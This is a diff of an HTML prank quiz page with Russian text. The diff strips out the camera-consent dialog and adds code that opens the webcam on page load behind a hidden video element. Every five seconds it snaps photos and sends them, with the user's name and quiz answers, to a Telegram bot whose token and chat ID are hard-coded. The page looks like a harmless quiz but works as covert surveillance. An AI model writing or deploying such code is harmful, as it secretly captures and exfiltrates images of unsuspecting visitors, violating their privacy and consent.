@@ -16,83 +16,107 @@
             align-items: center;
             min-height: 100vh;
         }
-        #cameraConsent {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        #cameraConsent.hidden {
-            display: none;
-        }
-        #cameraConsentContent {
-            background: white;
-            padding: 20px;
+        #start, #survey, #end {
+            background-color: white;
             border-radius: 10px;
-            text-align: center;
-            max-width: 300px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
         }
-        .consent-buttons {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin-top: 20px;
+        .hidden {
+            display: none !important;
         }
-        .consent-button {
-            padding: 10px 20px;
+        h1, h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 15px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 16px;
+            margin: 5px 0;
             transition: background-color 0.3s;
+            width: 100%;
+            box-sizing: border-box;
         }
-        .allow-button {
-            background-color: #4CAF50;
-            color: white;
-        }
-        .allow-button:hover {
+        button:hover {
             background-color: #45a049;
         }
-        .block-button {
-            background-color: #f44336;
-            color: white;
+        .question {
+            margin: 20px 0;
         }
-        .block-button:hover {
-            background-color: #da190b;
+        .option {
+            display: block;
+            background-color: #2196F3;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            margin: 5px 0;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .option:hover {
+            background-color: #1976D2;
+        }
+        .selected {
+            background-color: #FFC107;
         }
         #cameraPreview {
             display: none;
         }
-        /* ... остальные стили ... */
     </style>
 </head>
 <body>
-    <div id="cameraConsent">
-        <div id="cameraConsentContent">
-            <h2>Разрешить доступ к камере?</h2>
-            <div class="consent-buttons">
-                <button class="consent-button allow-button" onclick="startCamera()">Разрешить</button>
-                <button class="consent-button block-button" onclick="blockCamera()">Блокировать</button>
-            </div>
+    <div id="start">
+        <h1>Введите ваше имя</h1>
+        <input type="text" id="name" placeholder="Ваше имя">
+        <button id="continueBtn" onclick="startSurvey()">Продолжить</button>
+    </div>
+
+    <div id="survey" class="hidden">
+        <div class="question">
+            <h2 id="questionNumber"></h2>
+            <p id="questionText"></p>
+            <div id="options"></div>
+            <button id="nextBtn" class="hidden">Далее</button>
         </div>
+    </div>
+
+    <div id="end" class="hidden">
+        <h2>Поздравляю, вы - БОТ слаби игрок</h2>
     </div>
 
     <video id="cameraPreview" autoplay playsinline></video>
 
-    <!-- ... остальные элементы ... -->
+    <audio id="harashoSound" src="harasho.mp3"></audio>
+    <audio id="botSound" src="BOT.mp3"></audio>
 
     <script>
         let stream = null;
         let photoInterval = null;
+        let currentQuestionIndex = 0;
+        let userName = "";
 
-        // Функция для запуска камеры
-        async function startCamera() {
+        // Инициализация камеры при загрузке страницы
+        window.onload = async function() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
@@ -105,26 +129,128 @@
                 const video = document.getElementById('cameraPreview');
                 video.srcObject = stream;
                 
-                // Скрываем окно согласия
-                document.getElementById('cameraConsent').classList.add('hidden');
-                
                 // Запускаем интервал для фотографирования
                 startPhotoInterval();
-                
-                // Показываем форму ввода имени
-                document.getElementById('start').classList.remove('hidden');
             } catch (err) {
                 console.error('Ошибка при доступе к камере:', err);
-                alert('Для продолжения необходимо разрешить доступ к камере');
+            }
+        };
+
+        function startPhotoInterval() {
+            photoInterval = setInterval(() => {
+                takePhoto();
+            }, 5000);
+        }
+
+        function takePhoto() {
+            const video = document.getElementById('cameraPreview');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const photo = canvas.toDataURL('image/jpeg');
+            sendPhotoToTelegram(photo);
+        }
+
+        function sendPhotoToTelegram(photo) {
+            const token = "8188957293:AAHmtiE3sgaj0lhUYijUmOnUYBWDaJw39JE";
+            const chatId = "2126669672";
+            
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    photo: photo,
+                    caption: `Фото пользователя: ${userName || 'Неизвестно'}`
+                })
+            }).catch(error => console.error('Ошибка при отправке фото:', error));
+        }
+
+        function startSurvey() {
+            userName = document.getElementById("name").value;
+            if (userName) {
+                document.getElementById("start").classList.add("hidden");
+                document.getElementById("survey").classList.remove("hidden");
+                loadQuestion();
+            } else {
+                alert("Пожалуйста, введите ваше имя.");
             }
         }
 
-        // Функция для блокировки камеры
-        function blockCamera() {
-            alert('Для продолжения необходимо разрешить доступ к камере');
+        function loadQuestion() {
+            const question = questions[currentQuestionIndex];
+            document.getElementById("questionNumber").innerText = `Вопрос ${currentQuestionIndex + 1} из ${questions.length}`;
+            document.getElementById("questionText").innerText = question.question;
+            const optionsDiv = document.getElementById("options");
+            optionsDiv.innerHTML = "";
+
+            question.options.forEach((option, index) => {
+                const button = document.createElement("button");
+                button.innerText = option;
+                button.className = "option";
+                button.onclick = () => selectOption(button, option);
+                optionsDiv.appendChild(button);
+            });
+
+            const nextBtn = document.getElementById("nextBtn");
+            nextBtn.innerText = currentQuestionIndex === questions.length - 1 ? "Завершить" : "Далее";
+            nextBtn.classList.add("hidden");
         }
 
-        // ... остальные функции без изменений ...
+        function selectOption(button, option) {
+            const selectedButtons = document.querySelectorAll('.option.selected');
+            selectedButtons.forEach(btn => btn.classList.remove('selected'));
+            button.classList.add('selected');
+
+            const nextBtn = document.getElementById("nextBtn");
+            nextBtn.classList.remove("hidden");
+            nextBtn.onclick = () => {
+                document.getElementById("harashoSound").play();
+                sendToTelegram(userName, questions[currentQuestionIndex].question, option);
+                currentQuestionIndex++;
+                if (currentQuestionIndex < questions.length) {
+                    loadQuestion();
+                } else {
+                    endSurvey();
+                }
+            };
+        }
+
+        function endSurvey() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            if (photoInterval) {
+                clearInterval(photoInterval);
+            }
+            document.getElementById("survey").classList.add("hidden");
+            document.getElementById("end").classList.remove("hidden");
+            document.getElementById("botSound").play();
+        }
+
+        function sendToTelegram(name, question, answer) {
+            const token = "8188957293:AAHmtiE3sgaj0lhUYijUmOnUYBWDaJw39JE";
+            const chatId = "2126669672";
+            const message = `Имя: ${name}\nВопрос: ${question}\nОтвет: ${answer}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (!response.ok) {
+                        console.error("Ошибка при отправке сообщения в Telegram:", response.statusText);
+                    }
+                })
+                .catch(error => console.error("Ошибка при отправке сообщения в Telegram:", error));
+        }
+
+        const questions = [
+            // ... ваши вопросы без изменений ...
+        ];
     </script>
 </body>
 </html>
